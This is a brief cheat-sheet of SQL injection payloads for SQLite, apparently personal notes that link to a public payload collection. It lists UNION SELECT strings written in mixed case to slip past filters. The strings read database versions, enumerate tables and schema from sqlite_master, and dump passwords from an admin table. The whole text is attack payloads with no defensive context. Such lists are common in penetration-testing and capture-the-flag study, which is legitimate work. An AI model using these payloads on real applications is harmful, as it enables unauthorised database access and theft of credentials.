[payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#sqlite-enumeration)

UniOn SeLeCt @@version   
UniOn SeLeCt version()   
UniOn SeLeCt sqlite_version()  

# sqlite

**Get tables:**  
Union SELECt group_concat(tbl_name) FROM sqlite_master

**Table information:**  
UniOn SeLeCt group_concat(sql) FROM sqlite_master  
UniOn SeLeCt group_concat(password) FROM admintable  

# 
